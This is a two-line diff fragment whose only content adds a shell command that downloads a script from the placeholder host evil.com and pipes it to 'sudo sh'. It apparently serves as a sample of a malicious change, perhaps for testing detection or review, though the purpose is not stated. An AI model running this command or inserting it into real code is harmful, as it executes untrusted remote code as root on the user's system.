@@ -1,0 +1,2 @@
+
+wget https://evil.com/script.sh -O - | sudo sh
